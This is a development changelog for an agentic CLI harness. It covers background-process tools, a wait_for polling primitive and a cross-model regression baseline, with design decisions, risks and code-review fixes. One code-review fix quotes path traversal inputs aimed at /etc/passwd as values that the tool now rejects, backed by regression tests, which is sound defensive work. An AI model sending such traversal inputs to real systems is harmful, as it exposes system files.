  Regression test: 70KB filler + EXIT-MARKER-DRAIN +
  exit; before the fix, the marker was reported as
  processExited.
- **`getStatus` throws on cross-session ids.** Was:
  returned null, conflating "id doesn't exist anywhere"
  with "id belongs to another session" — both
  surfaced as `bg.process_not_found`, hiding the real
  diagnosis. Now: throws same shape as readOutput /
  kill (`bg process not in this session: ${id}`).
  process_exit's case in waitFor catches and re-
  throws, preserving the existing tool surface.
- **Removed dead `/g flag rejection` test.** Was: a
  test whose body was `expect(typeof ctx).toBe('object')`
  with a comment admitting the flag is unreachable
  via string-only schema. The `regex.global` check in
  the tool stays as defensive code, the test was
  noise.
- **Added empty-pattern rejection test.** Mirrors the
  existing "rejects empty process_id" — pattern
  validation was already in `buildCondition`, just
  uncovered.

**Risks documented:**

- **Patterns longer than `PATTERN_OVERLAP_BYTES = 64` may
  miss matches that straddle a poll boundary.** A 100-byte
  pattern split 70/30 across two polls would have only the
  last 64 of the first poll re-read, the leading 6 bytes
  of the pattern would be lost. Mitigation today:
  documented; configurable overlap can land if a real
  workflow surfaces longer patterns. Most "ready marker"
  patterns are <30 bytes — we're not close to the limit.
- **`process_output` matches on regex.exec, which is
  greedy.** A pattern like `/STARTED|FINISHED/` hits the
  first occurrence; if both substrings appear in the same
  poll's chunk, we only see the leftmost. Most ready-marker
  use cases are first-occurrence anyway, so this is the
  desired behavior. Multi-event observation belongs in
  `monitor` (2.2.3), not wait_for.
- **Race: process exits between getStatus poll and
  readOutput poll in process_output.** Status check happens
  AFTER readOutput; if the process exited mid-poll, we'd
  read the final bytes, fail to match, then notice
  `r.status !== 'running'` and report processExited. The
  final bytes ARE in the chunk we tested, so no real
  loss. Documented for completeness — observed-zero-impact.
- **Inherited from 2.2.1:** mtime granularity, port_open
  listen() init false-negative, HEAD unsupported on
  legacy servers.

---

## [2026-04-29] M3 / Step 2.2.1 — wait_for + non-bg conditions

Opens Step 2.2 (`wait_for` / `monitor` primitives, spec
§7.3.1) with the cheap-conditions slice: a wait_for tool
that supports `sleep`, `file_exists`, `file_change`,
`port_open`, and `http_response`. None of these depend on
the bg manager — they're standalone utility waits that any
synchronous workflow can use today.

**Why this slice first:**

- Spec §7.3.1 calls out the cost difference: 4-5 polling
  steps via repeated `bash_output` ≈ $0.40 in LLM calls
  vs `wait_for` ≈ $0.10. Even without process-aware
  conditions, the model gains `sleep` (no more "ask the
  user to wait" steps), `file_exists` (wait for a build
  artifact), `port_open` (wait for a server to be ready),
  and `http_response` (probe an endpoint). All immediately
  useful.
- Process-aware conditions (`process_exit`,
  `process_output`) need the bg manager's stream
  subscription surface — that's a different category of
  work (file watching with regex against a growing log).
  Splitting them out as 2.2.2 keeps each step's surface
  auditable.
- `monitor` and composition (`all_of`, `any_of`) are
  another distinct category — streaming events and
  recursive condition resolution. 2.2.3.

**Slice scope (2.2.1):**

| Component | Status | Notes |
|---|---|---|
| `src/wait/` module | NEW | `waitFor(condition, opts)` primitive + per-kind condition implementations |
| Condition `sleep` | NEW | `setTimeout` raced against signal-abort |
| Condition `file_exists` | NEW | poll `fs.existsSync` at `pollIntervalMs` (default 500ms); resolve immediately if already present |
| Condition `file_change` | NEW | snapshot mtime on first poll, compare on subsequent. mtime-based — granularity bounded by FS (1s on some) |
| Condition `port_open` | NEW | `net.connect` probe; success closes the connection, failure retries until timeout |
| Condition `http_response` | NEW | `fetch` HEAD/GET; optional `status?` match (else any 2xx) |
| Tool `wait_for` | NEW | category=`misc` (no command/path decision), planSafe (read-only) |
| Tests | NEW | Per-condition unit tests + tool-level integration tests. port_open + http_response use `Bun.serve` on ephemeral ports for deterministic fixtures |
| BACKLOG, bootstrap test | NEW | Tool count 9 → 10 |

**Out of scope for 2.2.1 (deferred):**

- **`process_exit` / `process_output` (2.2.2).** Need
  bg manager subscription. process_exit is cheap
  (already have `live` map with exitedSettled
  promises). process_output requires growing-log
  watch + regex matching with cursor — more involved.
- **`monitor` (2.2.3).** Streaming observation. Spec
  §7.3.1 makes it distinct from `wait_for` because
  the LLM runs at the END (after max_events / duration /
  cancellation), not on first match.
- **Composition (`all_of` / `any_of`, 2.2.3).**
  Recursive WaitCondition resolution. Spec acknowledges
  race-condition surface in `any_of`. Deferred so the
  base conditions are stable before the combinator
  layer lands on top.

**Decisions to make explicit upfront:**

- **Polling, not native filesystem watches.** `fs.watch`
  is platform-specific (inotify / FSEvents / Windows API)
  with subtle correctness gotchas (events drop on rename,
  some FSes don't fire). Spec §7.3.1 describes
  `chokidar / fs.watch` — both are watcher libraries with
  fallback layers we'd need to vendor. Going with mtime
  polling for v1: portable, simple, and the latency
  difference (≤ pollIntervalMs) is acceptable for the
  build-artifact / server-ready use cases.
- **`http_response` uses HEAD by default.** Avoids
  downloading a response body just to check status.
  When user wants body content (future enhancement),
  that's a different condition kind.
- **`port_open` opens then closes the probe connection
  immediately.** No data sent. Tests against a TCP
  service that doesn't accept connections (e.g. the
  socket exists but server is mid-init) will fail-fast
  on RST, which is the right signal.
- **No `process_*` conditions in this slice.** Even
  though the bg subsystem just landed, mixing it into
  2.2.1 would force the wait module to depend on bg
  internals before its own surface is stable.
- **Relative paths resolve against `ctx.cwd`, not
  `process.cwd()`.** Lesson carried over from the
  bash_background cwd review (commit `509f964`):
  `args.cwd` defaulting via `process.cwd()` silently
  runs in the wrong directory whenever the harness
  was launched with a different working dir than the
  session (evals, bootstrap-from-script, worktree
  subagents). Apply the same pattern to `file_exists`
  and `file_change` conditions when they accept a
  `path` arg — undefined unsupported (path is
  required), absolute used as-is, relative resolved
  via `resolve(ctx.cwd, path)`. Pin with regression
  tests that set `ctx.cwd` to a tmp dir distinct from
  the harness's process dir and assert the condition
  fires against the SESSION path, not the harness path.

**Spec reference:** `AGENTIC_CLI.md §7.3.1`,
`CONTEXT_TUNING.md §3` (cost rationale).

**Done:**

- New `src/wait/` module exporting `waitFor(condition, opts)`
  primitive plus the discriminated `WaitCondition` union for 5
  kinds. Internal poll loop dispatches per-kind; abort and
  timeout fold into a single `combinedSignal` via
  `buildTimeoutSignal()` so the polling code only watches one
  signal source. Cleanup function clears the timer on every
  exit path.
- Five conditions implemented:
  - `sleep` — `setTimeout` raced against caller signal. Edge
    case: when `durationMs > timeoutMs`, the wait reports
    `conditionMet: 'timeout'` rather than masquerading as a
    successful sleep.
  - `file_exists` — poll `fs.existsSync` at `pollIntervalMs`
    (default 500ms). Resolves immediately if the file is
    already present.
  - `file_change` — snapshot `mtimeMs` on first poll, compare
    on subsequent. Treats "missing → present" as a change so
    the model can wait for a build artifact to appear OR be
    refreshed. Payload reports both `mtimeMs` and
    `previousMtimeMs` (null when the file was missing
    initially).
  - `port_open` — `net.connect` probe with per-attempt
    timeout = `pollIntervalMs`. On failure, sleeps
    `min(pollIntervalMs, 100ms)` before retrying — fast-failing
    sockets don't need the full poll interval.
  - `http_response` — `fetch` HEAD with optional `status?`
    match (defaults to any 2xx). Caller signal threads through
    `fetch`'s own signal so a wait-level abort interrupts a
    slow server mid-request, not just between polls.
- `wait_for` tool (`src/tools/builtin/wait-for.ts`):
  - `category: 'misc'` + `planSafe: true` (pure observational
    primitive — no command, no path mutation; HEAD probes,
    file stats, TCP connect+close are all read-only).
  - Snake-case condition fields in the schema
    (`duration_ms`, `poll_interval_ms`, etc.) consistent with
    every other Forja tool surface.
  - Path resolution against `ctx.cwd` for `file_exists` /
    `file_change`. Lesson from commit `509f964`: relative paths
    must land in the session dir, not `process.cwd()`.
    Validation rejects unknown kinds and bad arg shapes with
    clean tool errors instead of letting `waitFor` throw.
- Tool count: 9 → 10. Bootstrap test updated.
- 17 unit tests in `tests/wait/wait-for.test.ts` cover every
  kind's match path, timeout path, and abort path. `port_open`
  uses `Bun.listen` on an ephemeral port; `http_response`
  uses `Bun.serve` with `/ok` (200) and `/teapot` (418)
  routes — no flaky external calls.
- 11 tool tests in `tests/tools/wait-for.test.ts`:
  happy paths (sleep / file_exists abs / file_exists relative
  resolves against ctx.cwd / file_change payload), timeout
  reporting, signal propagation (mid-wait abort + pre-aborted
  ctx returns clean tool error), input validation (unknown
  kind, missing required field, negative timeout, port out of
  range).
- Total: 732 pass / 7 skip / 0 fail. Typecheck + lint green.

**Decisions taken (not in opener):**

- **Rejected per-condition file modules.** Opener had me
  considering `src/wait/conditions/sleep.ts`, `port-open.ts`,
  etc. Single-file `src/wait/index.ts` is ~270 LOC and reads
  end-to-end in one screen — splitting would have added
  coordination cost (cross-file shared types like
  `WaitConditionMet`) without enabling parallel work. Revisit
  when 2.2.2 / 2.2.3 land more conditions.
- **`combinedSignal` pattern.** Internal helper
  `buildTimeoutSignal(timeoutMs, callerSignal)` returns a
  single signal that fires on EITHER the caller abort OR the
  internal timeout. The polling loop only checks one signal
  source; the `timeoutFired()` accessor lets the caller
  distinguish timeout-from-abort when reporting the result.
  Cleaner than tracking two signals across every await.
- **`http_response` defaults to "any 2xx".** Spec doesn't pin
  the default. 2xx is the common "service ready" semantic;
  models that want a specific code (418 for a teapot probe)
  pass `status` explicitly. A 4xx/5xx return without explicit
  `status` does NOT match — it's still a network success but
  the service isn't ready.
- **`mtime null → present` IS a change.** Strictly speaking
  "mtime change" implies the file existed at baseline. But
  the practical use case ("wait for the build artifact to
  appear or update") wants both shapes. Documented in JSDoc;
  payload's `previousMtimeMs: null` lets the caller
  distinguish creation from modification.
- **`port_open` per-attempt timeout = `pollIntervalMs`.**
  Without a per-attempt cap, a slow DNS lookup or
  unreachable host could hang each probe far longer than the
  poll interval. Capping at the poll interval keeps the loop
  responsive to the outer timeout.

**Pending (Step 2.2.2 / 2.2.3):**

- 2.2.2: `process_exit`, `process_output` (depend on bg
  manager subscription).
- 2.2.3: `monitor` (streaming events), `all_of` / `any_of`
  composition.

**Risks documented:**

- **mtime polling has 1-second granularity on some FS.**
  ext4 and APFS have sub-second mtimes; FAT and some NFS
  setups round to 1s. A back-to-back `writeFileSync` could
  land within the same mtime tick on those filesystems and
  the change goes undetected. Mitigation today: documented;
  the test `'matches when an existing file is modified'`
  uses a 200ms gap which exceeds the worst-case granularity.
  Pull-in signal: if a real workflow on a low-resolution FS
  flakes, switch to content-hash comparison or `fs.watch`
  (with all the platform fragility that entails).
- **`port_open` reports false negative on slow listen()
  socket initialization.** A server that calls `listen()` but
  hasn't fully bound yet may return RST instead of accepting
  — `tryConnect` reports false, the wait keeps polling. By
  next poll the bind has completed. Behavioral parity with
  any other "wait for server ready" pattern; spec
  acknowledges this in the §7.3.1 example.
- **`http_response` HEAD may be unsupported by some
  servers.** A few legacy services return 405 on HEAD. The
  current default (any 2xx) would never match. Pull-in
  signal: when a real workflow needs GET-style probing,
  add `method: 'GET' | 'HEAD'` to the condition.

**Code review fixes applied before commit:**

- **Reject `..` in path segments (file_exists / file_change).**
  The first draft resolved relative paths against `ctx.cwd` but
  did nothing to prevent `../../etc/passwd`-style traversal —
  `resolve()` happily collapses `..` and the model gets a
  boolean of existence + mtime for any path on the system.
  Cosmetic protection (model can pass `/etc/passwd` directly
  if absolute paths are allowed at all), but the cheap
  loader-style check closes the obvious leak vector. Rejects
  `..` segments in BOTH relative and absolute paths
  (`/foo/../etc/passwd` rejected too, since `..` in the
  middle obscures the actual target). 3 regression tests
  pin the contract: relative traversal rejected, absolute
  traversal rejected, filename containing literal `..`
  (e.g. `foo..txt`) accepted.
- **`tryConnect` honors caller signal.** Was: per-attempt
  hang up to the connect-timeout after caller abort, with
  the outer poll loop catching it on the next iteration.
  Now: `combinedSignal` is threaded into `tryConnect`; on
  abort, the socket is destroyed and the probe settles
  immediately. Regression test fires abort 50ms into a
  probe of a non-routable host and asserts the wait
  returns in <500ms (vs ~1.2s without the cascade).
- **`port_open` per-attempt timeout has a 200ms floor.**
  Was: connect timeout = `pollIntervalMs`, which at very
  low poll values (10ms) rejected legit DNS/handshake
  before they could complete. Now: `Math.max(pollIntervalMs,
  200)` for the connect attempt. The combined signal still
  cuts the attempt short on user timeout, so the floor
  doesn't hold the loop past the user-supplied cap.
- **`http_response` exposes `redirect` option.** Was:
  fetch followed 3xx silently, so a 301→200 chain
  matched as 200 and the model couldn't distinguish "the
  endpoint redirected" from "the endpoint responded".
  Now: `redirect?: 'follow' | 'manual'` on the condition.
  Default 'follow' preserves the prior behavior; 'manual'
  surfaces the literal status. 2 regression tests pin
  both modes (follow returns 200 from /redirect, manual
  returns 301).

**Code review follow-ups (not blocking, deferred):**

- **`file_change` accepts directories silently.** Spec says
  "file"; we don't reject. Could be feature or bug. Fix or
  document when a real workflow surfaces the ambiguity.
- **No path policy gate on `wait_for`** — operators can't
  deny `tools.wait_for.allow_paths: ['build/**']`. Same
  asymmetry exists for `port_open` / `http_response` (no
  network policy). Real fix: per-condition category routing
  (`fs.read` for file_*, future `net.probe` for network
  conditions) — needs engine support, scope of 2.2.3 or
  later.

---

## [2026-04-28] M3 / Step 2.1 — bash_background trio + storage

Opens M3 / Step 2 with the smallest cohesive slice of the
background-process subsystem: the three execution tools
(`bash_background`, `bash_output`, `bash_kill`) plus the
storage table that persists process state across turns.

**Why this subsystem next, why this slice first:**

- `bash_background` extends an existing tool (`bash`) rather
  than introducing a new architectural layer (subagents,
  MCP, slash commands). Lowest blast radius for a first
  M3-after-eval-regression step.
- It unblocks real workflows the M2 tool surface can't
  reach: long-running dev servers, file watchers, builds
  with progress output. Today the only options are
  "block bash for 30s and pray" or "give up on long
  commands."
- Wait/Monitor primitives (`§7.3.1`) are valuable but
  much bigger — file watching, port probing, HTTP
  polling, condition composition. They depend on
  `bash_background`'s process_id surface for half their
  conditions (`process_output`, `process_exit`).
  Splitting them out as Step 2.2 keeps each step's
  surface auditable.

**Plan (stepwise):**

- 2.1 — Storage migration + repo + process manager + 3
  tools + session-end cleanup + unit tests + 1
  regression case. **This entry.**
- 2.2 — `wait_for` and `monitor` primitives (the cheap
  conditions first: `sleep`, `file_exists`, `file_change`,
  `port_open`; then process-aware conditions on top of
  2.1's manager).
- 2.3 — `http_response` wait condition + composition
  (`all_of` / `any_of`).

**Slice scope (Step 2.1):**

| Component | Status | Notes |
|---|---|---|
| Migration `005-background-processes` | NEW | Table per spec §13 model. Indices on (session_id, status) |
| `bgProcessRepo` | NEW | Typed CRUD; `cleanup(sessionId)` marks running rows killed |
| Process manager | NEW | `src/bg/manager.ts`. Wraps `Bun.spawn`, log files in `.agent/bg/<id>.{stdout,stderr}.log`, exit-event → DB update, kill = SIGTERM → 5s grace → SIGKILL |
| Tool `bash_background` | NEW | category=`bash`, writes=true. Returns `{ process_id, label, spawned_at }` |
| Tool `bash_output` | NEW | category=`bash` (read-side; pessimistic), idempotent for fixed cursor. Cap N KB per call |
| Tool `bash_kill` | NEW | category=`bash`. Idempotent on already-exited |
| Session-end cleanup | NEW | Wired into harness exit path; best-effort via `process.on('exit')` |
| Unit tests | NEW | Manager (spawn/output/kill/exit), repo (CRUD/cleanup), 3 tools (perm denial, error paths) |
| Regression case | NEW | `36-bash-background-flow.yaml` — spawn sleep+echo, poll output, kill. Explicit multi-step prompt |

**Out of scope for 2.1 (deferred with rationale):**

- **`wait_for` / `monitor` (§7.3.1).** Step 2.2. Without
  these, the model has to poll via repeated
  `bash_output` calls — costs more LLM steps but works.
  Spec acknowledges the cost difference (`~$0.40` vs
  `~$0.10` for a port-ready loop). 2.1 ships the
  baseline; 2.2 adds the optimization. Cleaner than
  shipping a half-implemented wait/monitor surface.
- **`<BackgroundProcessTray>` UI.** No interactive UI
  yet. Tray waits for Ink work in the broader M3/M4
  scope. Status visible today via `bash_output` (the
  model's view) and the `background_processes` DB
  table (the audit log view).
- **`/bg cleanup` slash command.** Slash commands not
  implemented yet. Session-end cleanup covers the
  primary case (no zombies after a session ends);
  inter-session cleanup (orphaned rows from a crashed
  prior session) waits for slash command surface.
- **`maxOutputSize` per-process budget.** Spec doesn't
  pin this. We'll use a sane per-call cap on
  `bash_output` (e.g., 64 KB) but no total-output
  ceiling per process — operator manages disk via
  `bash_kill` if needed.

**Decisions to make explicit upfront:**

- **OS pid vs internal id.** The tool returns an
  internal `process_id` (UUID-class string), not the
  OS pid. Operator-facing diagnosis can pull the OS
  pid from the DB if needed; the public surface
  doesn't depend on OS-level identifiers (lets us
  swap process strategy later — daemon, remote, etc.
  — without breaking the tool contract). Spec §7.3 is
  intentionally vague on which one `process_id`
  refers to; we pin internal-id here.
- **Permission engine treatment.** All three tools
  fall under category=`bash`. The bash policy
  (`allow`/`deny`/`confirm`) gates the SPAWN COMMAND
  on `bash_background`. `bash_output` and `bash_kill`
  reference an existing process_id; we don't re-check
  the original command's policy on those calls (the
  decision was already made when spawning). If
  policy changes mid-session and a previously-allowed
  command's output is still being read, that's not a
  regression — the spawn was approved; reading
  stdout from an already-spawned process doesn't open
  new attack surface.
- **Log file path is in `.agent/bg/`.** Same prefix as
  the SQLite DB. Auto-created on first spawn.
  Cleanup: rotate by session_id at session start (or
  delete on `cleanup` call). 2.1 keeps the simplest
  policy: create on spawn, leave on disk after kill,
  cleanup happens via session-end manager pass.
- **No prompt-cache concern.** bg processes are local;
  no provider call involved. The harness loop's
  prompt-cache logic is independent.

**Spec reference:** `AGENTIC_CLI.md §7.3` (background
processes), `§13` (data model — `background_processes`),
`CONTRACTS §2.6` (tool contract). `§7.3.1` is the next
slice.

**Risks documented:**

- **Zombie processes on hard crash.** `process.on('exit')`
  is best-effort — `kill -9` to the harness leaves bg
  processes orphaned. Mitigation: store `os_pid` in
  DB so a future `agent doctor` (M4 spec §18) can
  detect and kill. Today: documented gap. Operators
  who run with autonomous agents over flaky
  connections should expect to occasionally clean up
  manually with `pkill -P <harness-pid>` or similar.
- **Log file disk usage / no gc.** Spec §7.3 says
  "Limpo no fim da sessão (ou via /bg cleanup)" —
  ambiguous between cleaning the PROCESSES (we do)
  and the log FILES (we don't). Decision: keep log
  files after session end so operators can do
  post-mortem inspection (a `npm run dev` that
  crashed yesterday is exactly the kind of thing
  someone wants to read tomorrow). Trade: `.agent/bg/`
  accumulates ~2 files per spawn forever. Pull-in
  signals to add gc:
    - `agent doctor` lands (M4) — natural place to
      run `forja bg gc --older-than=7d`.
    - Slash commands land — `/bg cleanup` per spec.
    - A real workflow saturates disk before either —
      add `max_log_bytes` or age-based prune as
      hotfix.
  The `npm run dev` + verbose-output worst-case is
  ~100 MB/hour. Single session is bounded; cross-
  session accumulation is the only concern, and
  that's a non-issue until someone hits it.
- **Multi-process race in DB updates.** Process
  exit events fire on Node's event loop; if two bg
  processes exit nanoseconds apart and both update
  the DB, SQLite's serialization handles it (we're
  WAL mode). Documented for completeness — no
  observed issue, but worth noting.
- **Operator can't deny output reads from already-
  spawned process.** `bash_output` and `bash_kill`
  are category=`misc` (auto-allowed). The defense
  in depth is at spawn time — if a spawn passes
  policy, reading its output and killing it are
  treated as already-approved operations. This is
  intentional (see code comments in those tools)
  but means a policy change mid-session won't
  retroactively gate output reads. Pull-in signal:
  if an operator workflow specifically wants
  policy-gated output reads, add a category
  `bg.read`/`bg.kill` and a corresponding
  `tools.bash_output` / `tools.bash_kill` policy
  section. Not blocking today.

**Done:**

- Migration 005 (`background_processes`) with 13 columns,
  2 indices, FK on session_id with cascade, CHECK on
  status enum (`running|exited|killed|failed`).
- Repo `bg-processes.ts` exposing
  `insertBgProcess` / `getBgProcess` / `listBgProcessesBySession`
  (with single+array status filter) /
  `advanceBgProcessCursor` (hot-path single UPDATE) /
  `finalizeBgProcess` (status='exited|killed|failed') /
  `markRunningAsKilled` (bulk session-level converge).
- Process manager `src/bg/manager.ts` factory
  `createBgManager({ db, sessionId, logDir })` exposing:
  - `spawn(input)` — `Bun.spawn` with stdout/stderr piped
    direct to `<id>.{stdout,stderr}.log` files, subscribes
    to `proc.exited` for natural-exit DB updates
  - `readOutput(id, { since?, maxBytes? })` — byte-cursor
    window read with UTF-8 replace decoding (binary-safe),
    advances persisted cursor on success, reports
    `stdoutPending` / `stderrPending` for truncation
  - `kill(id, { signal?, gracePeriodMs? })` — SIGTERM →
    grace via `Promise.race` → SIGKILL escalation,
    idempotent on already-finished processes
  - `cleanup()` — parallel kill of every still-running
    process for the session, plus `markRunningAsKilled`
    DB convergence for any kill that threw
- Three tools registered in builtin tool set
  (`bash_background`, `bash_output`, `bash_kill`),
  all under category `bash` so existing bash policy
  rules apply uniformly. Tool count: 6 → 9.
- `HarnessConfig.bgLogDir?: string` triggers
  session-scoped manager creation inside the loop
  (after `createSession`). Wired through
  `ToolContext.bgManager` so the three tools dispatch
  via closure-captured manager.
- Outer try/finally in `runAgent` calls
  `bgManager.cleanup()` on EVERY exit path: natural
  done, budget exhaustion, abort, internalError.
  Cleanup is best-effort — any thrown error is
  swallowed so the run's `HarnessResult` stays clean,
  and DB convergence via `markRunningAsKilled` ensures
  no zombie audit rows even if OS kills failed.
- CLI bootstrap auto-sets `bgLogDir = <cwd>/.agent/bg`
  per spec §2.7 — bg works end-to-end via `forja run`
  without operator config.
- 51 unit tests across the subsystem: 14 (repo) +
  20 (manager) + 17 (3 tools) = 51 new tests.
- 3 integration tests in `tests/harness/bg-cleanup.test.ts`
  prove the cleanup hook fires on natural exit, on
  internalError, AND that a missing `bgLogDir`
  produces clean `bg.manager_unavailable` errors
  rather than crashes.
- Regression case `36-bash-background-flow.yaml`
  exercises the full spawn→read→exit cycle. Validated
  1/1 on both Haiku 4.5 ($0.008, 4.8s) and gpt-4o-mini
  ($0.0006, 6.7s).
- Regression case `37-bg-output-kill-under-strict-policy.yaml`
  exercises the full bg flow under `defaults.mode: strict`
  with `tools.bash.allow: ['*echo*']` — proves operator
  policy works end-to-end (spawn passes via bash policy,
  bash_output/bash_kill pass via misc category).
  Validated 1/1 on Haiku ($0.013, 5.5s).

**Code review fixes applied before commit:**

The first draft had three bugs surfaced by review:

1. **Critical — `bash_output` and `bash_kill` denied
   under non-bypass policy.** Both were `category: 'bash'`,
   which routes through `checkBash` which requires
   `args.command`. Neither tool has that arg. Result:
   under any strict / acceptEdits policy, both default-
   denied. Fix: switched to `category: 'misc'` —
   spawn-time was already gated, reading/killing a
   previously-approved process opens no new attack
   surface. Documented the operator-gating gap in
   risks.
2. **Critical — single cursor lost stderr writes when
   stdout outpaced stderr.** Trace: stdout 50B,
   stderr 1B → cursor advances to 50 → next stderr
   read uses start=50, stderr_total=2 → returns empty
   forever (or skips intermediate bytes if stderr
   later exceeds 50). Fix: migration 006 adds
   `stderr_cursor_position`, manager reads two
   independent windows, repo exposes
   `advanceBgProcessStdoutCursor` /
   `advanceBgProcessStderrCursor`, tool surface
   exposes `since_stdout` / `since_stderr` and returns
   `stdout_cursor` / `stderr_cursor` separately.
   Regression test pins the specific failure mode
   (50B stdout + delayed stderr writes both before
   AND after first read).
3. **Critical — engine looked up bash policy by tool
   name, not category.** `bash_background` would never
   match `tools.bash.allow` rules — the engine called
   `lookupRules('bash_background', ...)` instead of
   `lookupRules('bash', ...)`. Operators writing the
   spec-correct `tools.bash.allow: ['npm *']` would
   find every `bash_background` denied. Fix:
   `policySectionFor()` collapses every
   bash-category tool to `tools.bash`. fs.* and
   web.fetch keep their per-tool sections (read_file's
   allow_paths is naturally distinct from
   write_file's). Surfaced by the failing case 37
   smoke; tightening engine logic was the right
   fix, not duplicating policy sections in user
   YAML.

Robustness / minor polish:

- Exit handler IIFE wrapped in try/finally so
  `live.delete(id)` always runs even when DB throws.
  Inner DB operations have their own try/swallow so
  a thrown error doesn't reject the stored Promise
  (kill/cleanup await it).
- Cleanup grace tightened: per-call kill keeps 5s
  default (operator-initiated, can wait), session-end
  cleanup uses 2s. Prevents 5s × N latency at exit
  for a session with many SIGTERM-ignoring processes.

**Decisions taken (not in opener):**

- **`bgManager` is owned by the harness loop, not by
  config.** Spec §13 has bg processes carrying a
  `session_id` FK, and `sessionId` is generated by
  `createSession` inside the loop. A pre-built manager
  passed via config would have stale or null
  sessionId. Solution: `HarnessConfig.bgLogDir`
  declares intent ("enable bg, here's where logs
  go"); the loop instantiates the manager lazily
  after `createSession`. Ownership = lifecycle;
  cleanup runs in the same try/finally that owns the
  session.
- **Tools surface a clean `bg.manager_unavailable`
  when ctx lacks the manager.** Three writes to
  `ToolError`-shape rather than throwing. Lets the
  model see "this capability isn't configured" and
  pick a different approach (use plain `bash`
  instead). Tested explicitly.
- **Cross-session id rejection.** Manager bound to
  session A throws `not in this session: <id>` if
  asked about a process from session B. Defensive —
  the DB is shared, so an attacker-supplied id from
  another session would otherwise leak output.
- **Output read is single-cursor on stdout.** Spec
  §7.3 calls for `bash_output(process_id, since?)` —
  one cursor. We read the same window from both
  stdout and stderr; if stderr lags, the next call
  catches it up. Asymmetric per-stream cursors
  would be more general but isn't what the spec
  specifies, and would complicate the audit trail.
- **`exitCode` recorded even on killed processes.**
  Useful diagnostic — kill via SIGTERM reports 143,
  SIGKILL reports 137. Distinguishing "operator
  killed cleanly" from "kernel had to escalate" is
  visible without log file inspection.

**Cut (out of 2.1, deferred with rationale):**

- **`wait_for` / `monitor` primitives (§7.3.1).**
  Step 2.2. The model can poll via repeated
  `bash_output` today — costs more LLM steps but
  works end-to-end. Spec acknowledges the cost
  difference (~$0.40 polling vs ~$0.10 with
  `wait_for`). 2.1 ships the baseline; 2.2 adds the
  optimization layer.
- **`<BackgroundProcessTray>` UI.** Tray waits for
  Ink work in M3/M4. Status visible today via
  `bash_output` (model view) and `background_processes`
  table (audit view).
- **`/bg cleanup` slash command.** Slash commands
  not implemented. Session-end cleanup covers the
  primary case; orphaned-from-prior-crash cleanup
  waits for slash command surface.
- **Per-process `max_log_bytes`.** No log rotation
  in 2.1. Listed as a documented risk. Add when a
  real workflow saturates disk.

**Pending (M3 next steps after Step 2):**

- Step 2.2 — `wait_for` primitive (`sleep`,
  `file_exists`, `file_change`, `port_open`,
  process-aware conditions on top of 2.1's manager).
- Step 2.3 — `monitor` primitive (streaming
  observation), `http_response` wait condition,
  composition (`all_of` / `any_of`).
- After Step 2: pick the next subsystem from M3
  scope (subagents, MCP, checkpoints+`/undo`,
  `todo_write`, Repo Map).

---

## [2026-04-28] M3 / Step 1.6 — Regression real-model baseline (closes Step 1)

Closes M3 / Step 1 by running the 35-case regression suite
against Anthropic Haiku 4.5 and OpenAI gpt-4o-mini, 3 rounds
each, and producing the parity matrix. Surfaces two
authoring bugs (cases 28 and 29) and four model-capability
divergences on gpt-4o-mini that we explicitly choose to
preserve rather than paper over.

**Why this slice closes Step 1:**

- Step 1.4 (parity matrix) was folded in here when Gemini
  was deferred. With two providers in scope, the
  measurement task IS the parity matrix.
- Step 1 originally targeted "~100 cases." We landed 35.
  Going broader without first proving the suite is stable
  would compound any structural issue (case design, prompt
  framing, expectation scope) across more cases. 35 with
  the parity matrix is the right exit criterion: enough
  surface to be load-bearing, small enough to fix in flight.

**Done — baseline matrix:**

| Provider | Model | Rounds | Pass rate | Total cost | Wall clock | p50 cost/case |
|---|---|---|---|---|---|---|
| Anthropic | Haiku 4.5 | 3 | 105/105 (100%) | $0.7994 | 11.4 min | $0.0042 |
| OpenAI | gpt-4o-mini | 3 | 91/105 (86.7%) | $0.0818 | 8.8 min | $0.0002 |

**Cost ratio: 9.8× cheaper on gpt-4o-mini, with 13.3pp
lower pass rate.** The same dynamic the smoke baseline
recorded (Step 6.3: $0.0050 vs $0.0002 p50, both 100%
on smoke) — at regression depth, the cost gap holds but
the pass rate gap appears.

**Authoring fixes applied DURING the baseline run:**

Smoke-check round (1 round Haiku) before the full baseline
caught two cases that were reliable on Haiku 4.5 but had
expectation/budget issues:

- **Case 28** (`plan-mode-multi-tool-readonly-chain`):
  `status: exhausted` because `maxSteps: 6` was tight
  for grep + read + plan-markdown emission. Bumped to
  `maxSteps: 8`. Strictly more permissive — cannot break
  any other case.
- **Case 29** (`plan-and-policy-coexist`): asserted
  `output_contains: "# Plan"` after a policy-denied
  bash call. Model correctly attempted bash → got
  denied → reported the denial → did NOT emit a plan
  markdown afterward. The case's core invariant is the
  gate-stack composition (`tool_denied: bash` after
  plan-gate let it through). Plan-markdown emission
  was over-broad assertion outside the case's scope.
  Dropped that one assertion. Strictly weaker — cannot
  break what was passing.

Both fixes re-verified on Haiku (35/35 second
smoke-check) before the 3-round baseline kicked off.

**gpt-4o-mini divergences (per-case stability):**

| # | Case | Stability | Diagnosis |
|---|---|---|---|
| 12 | glob → read first match | 0/3 | gpt-4o-mini calls glob and stops — interprets the file list as the answer rather than chaining into read_file |
| 23 | compaction multi-round | 0/3 | Hits `maxSteps: 14` budget. gpt-4o-mini takes more steps than Haiku for the same 10-read sequence. Even with `--timeout-ms 180000` (validated separately), still exhausts. Different completion strategy, not a wall-clock issue |
| 28 | plan + multi-tool readonly chain | 0/3 | Same family as #12: calls grep, never read_file. `status: error` |
| 30 | grep → edit | 0/3 | Same family: calls grep, never edit_file |
| 5 | edit_file disambiguation | 2/3 | Round 2 the model called write_file instead of edit_file, even with the file already existing. Flaky |
| 25 | compaction preserve_tail=0 | 1/3 | Rounds 1+2 picked wrong tools (glob/grep instead of read_file). Round 3 worked. Inconsistent prompt interpretation |

Pattern: 4 of 6 failures are "gpt-4o-mini calls one tool
of a multi-tool chain and stops." Case 23 is a different
family (more-steps-than-Haiku for the same work). Case 5
is rare flake.

**Decisions:**

- **Cases 12, 28, 30, 23 stay in the suite — no prompt
  gaming.** Step 6.5 explicitly documented: "If the
  case fails reliably on one provider but passes on
  another, that's a model capability divergence, not a
  harness bug — record it in the parity matrix and
  accept it." Strengthening prompts ("YOU MUST CALL X
  THEN Y") to satisfy the weaker model would game the
  test, hide the real model gap, and create false
  confidence. The cases capture real coverage on
  Haiku 4.5 and any future stronger model. They will
  light up red on gpt-4o-mini as expected and that's
  diagnostic, not a bug.
- **Provider-aware threshold becomes the gate model.**
  CI gate (deferred per `docs/TODO.md`) cannot use a
